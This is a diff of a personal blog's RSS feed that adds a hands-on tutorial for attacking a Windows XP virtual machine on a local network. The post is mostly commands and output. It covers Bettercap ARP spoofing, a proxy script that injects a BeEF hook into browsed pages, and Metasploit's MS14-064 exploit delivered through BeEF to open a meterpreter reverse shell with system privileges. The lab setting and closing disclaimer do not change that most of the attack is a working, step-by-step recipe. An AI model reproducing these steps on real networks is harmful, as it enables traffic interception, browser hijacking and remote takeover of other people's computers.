@@ -4,7 +4,427 @@
         <link>http://weepingdogel.github.io/tags/penetration-testing/</link>
         <description>Penetration Testing - Tag - WeepingDogel</description>
         <generator>Hugo -- gohugo.io</generator><language>en</language><managingEditor>weepingdogel@gmail.com (WeepingDogel)</managingEditor>
-            <webMaster>weepingdogel@gmail.com (WeepingDogel)</webMaster><lastBuildDate>Sat, 26 Sep 2020 13:14:18 &#43;0800</lastBuildDate><atom:link href="http://weepingdogel.github.io/tags/penetration-testing/" rel="self" type="application/rss+xml" /><item>
+            <webMaster>weepingdogel@gmail.com (WeepingDogel)</webMaster><lastBuildDate>Tue, 02 Feb 2021 13:43:23 &#43;0800</lastBuildDate><atom:link href="http://weepingdogel.github.io/tags/penetration-testing/" rel="self" type="application/rss+xml" /><item>
+    <title>LAN Penetration Testing with Beef, Bettercap, and Other Tools</title>
+    <link>http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</link>
+    <pubDate>Tue, 02 Feb 2021 13:43:23 &#43;0800</pubDate>
+    <author>WeepingDogel</author>
+    <guid>http://weepingdogel.github.io/posts/beef%E9%85%8D%E5%90%88bettercap%E4%BB%A5%E5%8F%8Amsf%E7%AD%89%E5%A4%9A%E7%A7%8D%E5%B7%A5%E5%85%B7%E7%9A%84%E5%B1%80%E5%9F%9F%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</guid>
+    <description><![CDATA[<div class="featured-image">
+                <img src="/img/2021-02-02_13-51.png" referrerpolicy="no-referrer">
+            </div><h2 id="introduction">Introduction</h2>
+<p>Well&hellip; Let&rsquo;s start with some rambling as usual&hellip;</p>
+<p>Today, I tried using Beef and Bettercap together and found them to be quite effective~</p>
+<p>Also, if you are using Internet Explorer (IE), you can use Beef in conjunction with the ms14-064 module in Metasploit to gain system privileges~</p>
+<p>Without further ado, let&rsquo;s get started~</p>
+<h3 id="testing-environment">Testing Environment</h3>
+<p>First, let&rsquo;s talk about the testing environment.</p>
+<ul>
+<li>
+<p>Attacker machine</p>
+<ul>
+<li>Arch Linux</li>
+<li>192.168.101.15</li>
+</ul>
+</li>
+<li>
+<p>Target machine</p>
+<ul>
+<li>Windows XP on VirtualBox</li>
+<li>192.168.101.43</li>
+</ul>
+</li>
+</ul>
+<p>Due to limited resources, we can only use Windows XP for this demonstration~</p>
+<h3 id="tools-used">Tools Used</h3>
+<ol>
+<li>Bettercap
+<ul>
+<li>First and foremost, Bettercap~ It is used for ARP spoofing, DNS hijacking, and network interruption attacks, which are all part of man-in-the-middle attacks&hellip;</li>
+</ul>
+</li>
+<li>Beef
+<ul>
+<li>Used for browser hijacking&hellip; and it can do many things, but I don&rsquo;t know the specifics.</li>
+</ul>
+</li>
+<li>Metasploit (msf)
+<ul>
+<li>Our old friend~</li>
+</ul>
+</li>
+</ol>
+<h2 id="testing-process">Testing Process</h2>
+<p>First, let&rsquo;s open <code>bettercap</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo bettercap
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Then we will see the following output..</p>
+<p></p>
+<p><strong>Note: You need to use sudo here because it requires root privileges to access network hardware such as network cards. If you don&rsquo;t use sudo, you will see a prompt like this.</strong></p>
+<p></p>
+<p>Next, set the target for ARP spoofing:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">set arp.spoof.targets 192.168.101.43
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>Here, the targets are set to the IP address of the target machine.</strong></p>
+<p>Next, start Beef, and remember to use <code>sudo</code> as mentioned earlier.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo beef
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The output should be like this:</p>
+<p></p>
+<p>Now, let&rsquo;s talk about the links displayed in the terminal:</p>
+<ul>
+<li>Hook URL:  <a href="http://192.168.101.15:3000/hook.js" target="_blank" rel="noopener noreffer ">http://192.168.101.15:3000/hook.js</a>
+<ul>
+<li>This is the hook address mentioned earlier. Once a browser visits a page with this JavaScript, it will be hooked by Beef~
+Later, we will write it into an attack script~</li>
+</ul>
+</li>
+<li>UI URL: <a href="http://192.168.101.15:3000/ui/panel" target="_blank" rel="noopener noreffer ">http://192.168.101.15:3000/ui/panel</a>
+<ul>
+<li>This is the Beef control panel. After opening it, you will see a login page, similar to the cover image. After logging in, it will look like this.</li>
+</ul>
+</li>
+</ul>
+<p></p>
+<p>About the username and password, here&rsquo;s the thing: In some systems, you can&rsquo;t use the default login credentials <code>(beef:beef)</code> for Beef, and it may not even start. For example, this is the case with my Arch Linux.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">[14:40:25][!] ERROR: Default username and password in use!
+</span></span><span class="line"><span class="cl">[14:40:25]    |_  Change the beef.credentials.passwd in config.yaml
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>In such cases, what you need to do is modify the <code>config.yaml</code> file. In my case, the file is located at <code>/usr/share/beef/config.yaml</code>.</p>
+<p>Modify it as follows:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="line"><span class="cl"><span class="nt">beef</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">version</span><span class="p">:</span><span class="w"> </span><span class="s1">&#39;0.5.0.0-alpha-pre&#39;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c"># More verbose messages (server-side)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">debug</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c"># More verbose messages (client-side)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">client_debug</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c"># Used for generating secure tokens</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">crypto_default_value_length</span><span class="p">:</span><span class="w"> </span><span class="m">80</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c"># Credentials to authenticate in BeEF.</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c"># Used by both the RESTful API and the Admin interface</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nt">credentials</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">user</span><span class="p">:</span><span class="w">   </span><span class="s2">&#34;Choose a username&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="nt">passwd</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;Think of a password&#34;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>After that, you can start the system, and the username and password you set will be used for login.</p>
+<p>Alright, without further ado, let&rsquo;s continue.</p>
+<p>Next, we need to write a JavaScript script to use with Bettercap.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">onResponse</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="nx">res</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">res</span><span class="p">.</span><span class="nx">ContentType</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s1">&#39;text/html&#39;</span><span class="p">)</span><span class="o">==</span><span class="mi">0</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">body</span><span class="o">=</span><span class="nx">res</span><span class="p">.</span><span class="nx">ReadBody</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">body</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s1">&#39;&lt;/head&gt;&#39;</span><span class="p">)</span><span class="o">!=-</span><span class="mi">1</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">res</span><span class="p">.</span><span class="nx">Body</span><span class="o">=</span><span class="nx">body</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                <span class="s1">&#39;&lt;/head&gt;&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">               <span class="s1">&#39;&lt;script type=&#34;text/javascript&#34; src=&#34;http://192.168.101.15:3000/hook.js&#34;&gt;&lt;/script&gt;&lt;/head&gt;&#39;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Save this file to a directory of your choice. I will save it to <code>/home/weepingdogel/Downloads/hack/192.168.101.43/hack.js</code>.</p>
+<p>Then, let&rsquo;s go back to Bettercap and set the <code>http.proxy.script</code> parameter to the path mentioned above:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">set http.proxy.script /home/weepingdogel/Downloads/hack/192.168.101.43/hack.js
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Then start <code>net.probe</code>, <code>arp.spoof</code>, and <code>http.proxy</code> in sequence.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">net.probe on
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">arp.spoof on
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">http.proxy on
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Alright&hellip; Now everything is set up and ready to go&hellip;</p>
+<p></p>
+<p>Then we&rsquo;ll have the target machine open a browser and visit a website&hellip;</p>
+<p>Since IE8 no longer supports HTTPS for Bing, it will be vulnerable as soon as it opens.</p>
+<p></p>
+<p></p>
+<p>And then there&rsquo;s so much we can do.</p>
+<p></p>
+<p>I decided to use a clippy module that binds to a <code>ms14-064</code> address, and now it&rsquo;s msf&rsquo;s turn.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ msfconsole
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p></p>
+<p>Enable Modules.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">&gt; use exploit/windows/browser/ms14_064_ole_code_execution
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">&gt; info 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Let&rsquo;s see the description.</p>
+<blockquote>
+<p>Description:</p>
+<p>This module exploits the Windows OLE Automation array vulnerability,
+CVE-2014-6332. The vulnerability is known to affect Internet
+Explorer 3.0 until version 11 within Windows 95 up to Windows 10,
+and no patch for Windows XP. However, this exploit will only target
+Windows XP and Windows 7 box due to the Powershell limitation.
+Windows XP by defaults supports VBS, therefore it is used as the
+attack vector. On other newer Windows systems, the exploit will try
+using Powershell instead.</p>
+</blockquote>
+<p>Check the options</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">show options
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Module options (exploit/windows/browser/ms14_064_ole_code_execution):
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Name                   Current Setting  Required  Description
+</span></span><span class="line"><span class="cl">   ----                   ---------------  --------  -----------
+</span></span><span class="line"><span class="cl">   AllowPowershellPrompt  false            yes       Allow exploit to try Powershell
+</span></span><span class="line"><span class="cl">   Retries                true             no        Allow the browser to retry the module
+</span></span><span class="line"><span class="cl">   SRVHOST                0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+</span></span><span class="line"><span class="cl">   SRVPORT                8080             yes       The local port to listen on.
+</span></span><span class="line"><span class="cl">   SSL                    false            no        Negotiate SSL for incoming connections
+</span></span><span class="line"><span class="cl">   SSLCert                                 no        Path to a custom SSL certificate (default is randomly generated)
+</span></span><span class="line"><span class="cl">   TRYUAC                 false            yes       Ask victim to start as Administrator
+</span></span><span class="line"><span class="cl">   URIPATH                                 no        The URI to use for this exploit (default is random)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Payload options (windows/meterpreter/reverse_tcp):
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Name      Current Setting  Required  Description
+</span></span><span class="line"><span class="cl">   ----      ---------------  --------  -----------
+</span></span><span class="line"><span class="cl">   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)
+</span></span><span class="line"><span class="cl">   LHOST     192.168.101.15   yes       The listen address (an interface may be specified)
+</span></span><span class="line"><span class="cl">   LPORT     4444             yes       The listen port
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Exploit target:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   Id  Name
+</span></span><span class="line"><span class="cl">   --  ----
+</span></span><span class="line"><span class="cl">   0   Windows XP
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Normally we would just set a <code>SRVHOST</code>, but <code>bettercap</code> just took port <code>8080</code>, so we need to set a new <code>SRVPORT</code>.</p>
+<p>The <code>SRVHOST</code> is set to the address of the attacking machine.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">set SRVHOST 192.168.101.15
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>SRVPORT</code> Arbitrarily specify a free port</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">set SRVPORT 9999
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Execute.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">exploit
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Then we get it</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">[*] Exploit running as background job 0.
+</span></span><span class="line"><span class="cl">[*] Exploit completed, but no session was created.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[*] Started reverse TCP handler on 192.168.101.15:4444 
+</span></span><span class="line"><span class="cl">[*] Using URL: http://192.168.101.15:9999/deCFhCIwXNHYT
+</span></span><span class="line"><span class="cl">[*] Server started.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Change the default <code>Clippy image directory</code> address to the attacker&rsquo;s address, then put the link <code>http://192.168.101.15:9999/deCFhCIwXNHYT</code> in the <code>Executable</code> field.</p>
+<p></p>
+<p>Then click the <code>execute</code>.</p>
+<p>That&rsquo;s when a funny thing happens to the target machine.</p>
+<p></p>
+<p>Whichever one you click on, it jumps to the msf link.
+After clicking on it, msf responds.</p>
+<p></p>
+<p>A <code>meterpreter</code> connection is established.</p>
+<p></p>
+<p>Get in the session.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">sessions -i 1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p></p>
+<p>At this point we can use <code>meterpreter</code> to operate the target machine as normal&hellip;</p>
+<p></p>
+<p>The <code>getsystem</code> lifting is also no problem.</p>
+<p>As for the use of <code>meterpreter</code>, I will not continue to write about it, because I have written about it before (escape.).</p>
+<p>Then here is half of the success, the rest is the post-penetration, say a long time can not finish it ~ ~ here it is ~</p>
+<h2 id="end">End</h2>
+<p>I&rsquo;m sorry, but I&rsquo;m not sure if I&rsquo;m going to be able to do this. qwq
+However, to declare that the content of this article is limited to the test to learn to use, <strong>do not take to do bad things</strong>, or the consequences of their own Oh ~</p>
+<p>Finally, this site follows the [CC-BY-NC 4.0 protocol] (<a href="https://creativecommons.org/licenses/by-nc/4.0/%29" target="_blank" rel="noopener noreffer ">https://creativecommons.org/licenses/by-nc/4.0/)</a>, reproduced please specify the source!</p>
+<h2 id="reference-links">Reference links</h2>
+<ul>
+<li><a href="https://cvedetails.com/cve/CVE-2014-6332/" target="_blank" rel="noopener noreffer ">CVE-2014-6332 : OleAut32.dll in OLE in Microsoft Windows Server 2003 SP2, Windows Vista SP2, Windows Server 2008 SP2 and R2 SP1, Windows</a></li>
+<li><a href="https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2014/MS14-064" target="_blank" rel="noopener noreffer ">Microsoft Security Bulletin MS14-064 - Critical | Microsoft Docs</a></li>
+<li><a href="https://www.exploit-db.com/exploits/35229" target="_blank" rel="noopener noreffer ">Microsoft Internet Explorer 11 - OLE Automation Array Remote Code Execution (1) - Windows remote Exploit</a></li>
+<li><a href="https://www.exploit-db.com/exploits/35308" target="_blank" rel="noopener noreffer ">Microsoft Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / PowerShell VirtualAlloc (MS14-064) - Windows remote Exploit</a></li>
+<li><a href="http://securityintelligence.com/ibm-x-force-researcher-finds-significant-vulnerability-in-microsoft-windows" target="_blank" rel="noopener noreffer ">IBM X-Force Researcher Finds Significant Vulnerability in Microsoft Windows</a></li>
+<li><a href="https://forsec.nl/2014/11/cve-2014-6332-internet-explorer-msf-module" target="_blank" rel="noopener noreffer ">CVE-2014-6332: it’s raining shells | forsec</a></li>
+<li><a href="https://usstzt.site/2020/05/26/bettercap%E7%9A%84%E4%BD%BF%E7%94%A8/#&amp;gid=1&amp;pid=2" target="_blank" rel="noopener noreffer ">kali bettercap的使用 | UsstZt</a></li>
+<li><a href="https://blog.csdn.net/qq_33066259/article/details/80737308" target="_blank" rel="noopener noreffer ">Bettercap2.6与beef的使用_请你吃橘子-CSDN博客</a></li>
+<li><a href="https://www.deepl.com/translator#en/zh/This%20module%20exploits%20the%20Windows%20OLE%20Automation%20array%20vulnerability%2C%20CVE-2014-6332.%20The%20vulnerability%20is%20known%20to%20affect%20Internet%20Explorer%203.0%20until%20version%2011%20within%20Windows%2095%20up%20to%20Windows%2010%2C%20and%20no%20patch%20for%20Windows%20XP.%20However%2C%20this%20exploit%20will%20only%20target%20Windows%20XP%20and%20Windows%207%20box%20due%20to%20the%20Powershell%20limitation.%20Windows%20XP%20by%20defaults%20supports%20VBS%2C%20therefore%20it%20is%20used%20as%20the%20attack%20vector.%20On%20other%20newer%20Windows%20systems%2C%20the%20exploit%20will%20try%20using%20Powershell%20instead." target="_blank" rel="noopener noreffer ">DeepL Translate</a></li>
+</ul>]]></description>
+</item>
+<item>
     <title>Attacking CentOS6 Virtual Machines</title>
     <link>http://weepingdogel.github.io/posts/2020-09-26/</link>
     <pubDate>Sat, 26 Sep 2020 13:14:18 &#43;0800</pubDate>
